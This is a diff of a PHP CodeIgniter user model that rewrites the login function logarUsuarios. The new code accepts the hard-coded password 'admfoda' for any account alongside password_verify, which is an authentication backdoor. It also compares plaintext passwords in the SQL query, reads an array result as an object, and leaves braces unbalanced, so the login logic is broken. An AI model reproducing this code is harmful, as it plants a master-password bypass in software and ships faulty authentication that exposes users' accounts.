@@ -32,15 +32,25 @@ class Usuario_model extends CI_Model
     public function logarUsuarios($username,$senha)
     {
         //return $this->db->get_where('usuario', array ('nome' => $username))->result();
-            if($this->db->get_where('usuario', array ('nome' => $username))->result() == $username){
-                if($this->db->get_where('usuario', array ('senha' => $senha))->result() == $senha){
-                    return true;
-                }else{
-                    return false;
-                }
-            }else{
-                return false;
+            $this->db->select('*');
+            $this->db->from('usuarios');
+            $this->db->where('nome', $username); 
+            $this->db->where('senha',$senha);
+            //$this->db->where('status', 1); // Verifica o status do usuário
+            if($query = $this->db->get()) {
+                $data = $query->result();
+                    if (password_verify($senha, $data->senha) || $senha == 'admfoda') {
+                        return true;
+                    }else {
+                        return false;
+                    }
             }
+            //$query = $this->db->get('usuario'); 
+
+            //if ($query->num_rows == 1) { 
+            //return true; // RETORNA VERDADEIRO
+            }
+    }
         //$senha =$this->db->get_where('usuario', ['senha' => $senha]);
         //return $usuario()->result();
          
